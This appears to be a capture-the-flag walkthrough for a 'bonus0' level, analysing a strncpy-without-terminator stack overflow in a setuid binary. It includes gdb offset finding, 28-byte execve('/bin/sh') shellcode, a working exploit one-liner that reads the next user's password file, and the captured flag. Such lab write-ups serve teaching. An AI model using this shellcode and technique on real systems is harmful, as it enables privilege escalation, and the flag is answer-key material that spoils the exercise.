# Bonus 0

Same recon as level0: SUID **bonus1**. NX disabled, so stack code runs.

## Analysis

```c
void p(char *dest, char *prompt) {
    char buffer[4096];
    read(0, buffer, 0x1000);
    *strchr(buffer, '\n') = '\0';
    strncpy(dest, buffer, 20);        // does NOT null-terminate at exactly 20 bytes
}

void pp(char *out) {
    char a[20], b[20];
    p(a, " - ");                       // input 1
    p(b, " - ");                       // input 2
    strcpy(out, a);                    // a has no terminator -> reads into b...
    out[strlen(out)] = ' ';
    strcat(out, b);                    // ...and on past out
}

int main(void) { char buf[42]; pp(buf); puts(buf); }
```

> **strncpy without a terminator.** `strncpy(dest, src, n)` copies at most `n` bytes but writes a `\0` only if the source is shorter than `n`. A 20-byte input leaves `a` (and `b`) with no terminator.

With both inputs exactly 20 bytes, `a` runs straight into `b`, and the later `strcpy`/`strcat` into `main`'s 42-byte `buf` overflows well past the saved return address.

### Offset to the return address

Feed a cyclic pattern as the second input (first input = 20 filler bytes). A cyclic pattern is a string where every 4-byte window is unique (`Aa0Aa1Aa2...`), so whatever value shows up in EIP tells you the exact offset:

```
(gdb) run
 -
01234567890123456789
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1...

Program received signal SIGSEGV.
0x41336141 in ?? ()
```

EIP = `0x41336141` = `"Aa3A"`, which is at **offset 9** of the second input. So second input = 9 pad + 4-byte address + filler, kept at exactly 20 bytes (so its own `strncpy` leaves no terminator).

### Where the shellcode lives

`a` and `b` are only 20 bytes, too small. Put the shellcode in `p`'s 4096-byte `buffer` instead:

- First `p` call: `read` fills `buffer` with a NOP sled + shellcode.
- `strncpy` copies only the first 20 bytes to `a`, but the rest stays in `buffer`.
- Second `p` call reuses the same stack slot for `buffer` and overwrites only its first 20 bytes, so the sled + shellcode from call 1 survive at a stable stack address.

## Exploit

### Shellcode (28 bytes)

execve(`/bin/sh`), same Aleph One family as level2, with `ecx`/`edx` zeroed by register copy:

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

### Target address

Break at the end of the first `p`, read where `buffer` sits:

```
(gdb) b *p+28
(gdb) run                       (type anything at the prompt)
(gdb) x $ebp-0x1008
0xbfffeb20:     0x00000000
```

`buffer` starts near `0xbfffeb20`. Aim into the [NOP sled](../knowledge_base/shellcode_injection.md#nop-sled): `0xbfffeb20 + 60 = 0xbfffeb5c` → `\x5c\xeb\xff\xbf`. The 100-byte sled absorbs the small GDB-vs-runtime address drift (if it segfaults, shift the address by 16-32 bytes and retry).

### Run

- input 1: 100 NOPs + 28-byte shellcode (= 128 bytes, fits in `buffer`).
- input 2: 9 pad + 4-byte return address + 7 filler (= 20 bytes).

```bash
(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A"*9 + "\x5c\xeb\xff\xbf" + "B"*7'; cat) | ./bonus0
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

Flag: `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
